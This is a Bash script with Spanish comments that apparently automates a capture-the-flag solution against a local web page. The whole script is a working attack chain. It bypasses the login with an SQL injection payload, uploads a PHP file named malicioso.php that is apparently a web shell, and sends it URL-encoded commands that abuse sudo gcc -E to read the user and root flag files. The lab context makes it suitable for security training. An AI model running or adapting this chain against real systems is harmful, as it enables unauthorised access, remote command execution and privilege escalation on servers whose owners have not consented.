#!/bin/bash

sudo apt install curl -y

# URL de la página de login
URL="http://localhost/pagina/login.php"
URL2="http://localhost/pagina/upload.php"
FILE_PATH="/var/www/html/pagina/malicioso.php"

# Payload malicioso para SQL Injection
PAYLOAD_USERNAME="' OR 1=1 -- "
PAYLOAD_PASSWORD="' OR 1=1 -- "

# Enviar la solicitud POST usando curl
echo "[*] Enviando payload al login..."
RESPONSE=$(curl -s -X POST -d "username=$PAYLOAD_USERNAME&password=$PAYLOAD_PASSWORD" $URL)

# Verificar si logramos el acceso
if echo "$RESPONSE" | grep -q "Upload a File"; then
    echo "[+] Acceso concedido. Hemos bypassado el login."
    #echo "[+] Respuesta del servidor:"
    #echo "$RESPONSE"
else
    echo "[-] No se logró el acceso. Verifica el payload y el endpoint."
fi

if [ ! -f "$FILE_PATH" ]; then
    echo "[-] El archivo $FILE_PATH no existe."
    exit 1
fi

# Enviar el archivo usando curl
echo "[*] Subiendo el archivo $FILE_PATH al servidor..."
RESPONSE=$(curl -s -X POST -F "file=@$FILE_PATH" $URL2)

if echo "$RESPONSE" | grep -q "File successfully uploaded"; then
    echo "[+] Archivo subido con éxito."
    #echo "[+] Respuesta del servidor:"
    #echo "$RESPONSE"

    # Extraer el enlace del archivo subido
    FILE_URL=$(echo "$RESPONSE" | grep -oP "(?<=<a href=')[^']+")
    FULL_FILE_URL="http://localhost/pagina/$FILE_URL"
    echo "[*] Accediendo al archivo subido en: $FULL_FILE_URL"
    
    # Acceder al archivo subido
    echo "[*] Extrayendo la flag de www-data"
    CMD="sudo gcc -x c -E /home/www-data/user.txt"
    ENCODED_CMD=$(echo "$CMD" | jq -sRr @uri) # Se necesita jq para codificar URL
    FILE_RESPONSE=$(curl -s "${FULL_FILE_URL}?cmd=${ENCODED_CMD}")
    
    #echo "[+] Respuesta del archivo subido:"
    #echo "$FILE_RESPONSE"

    USER_FLAG=$(echo "$FILE_RESPONSE" | grep -o "ssi{[^}]*}" | tail -n 1)
    echo "[+] Flag de www-data: $USER_FLAG" 

    echo "[*] Extrayendo la flag de root"
    CMD="sudo gcc -x c -E /root/root.txt"
    ENCODED_CMD=$(echo "$CMD" | jq -sRr @uri) # Se necesita jq para >
    FILE_RESPONSE=$(curl -s "${FULL_FILE_URL}?cmd=${ENCODED_CMD}")
    
    #echo "[+] Respuesta del archivo subido:"
    #echo "$FILE_RESPONSE"

    ROOT_FLAG=$(echo "$FILE_RESPONSE" | grep -o "ssi{[^}]*}" | tail -n 1)
    echo "[+] Flag de root: $ROOT_FLAG" 
else
    echo "[-] Error al subir el archivo. Respuesta del servidor:"
    echo "$RESPONSE"
fi
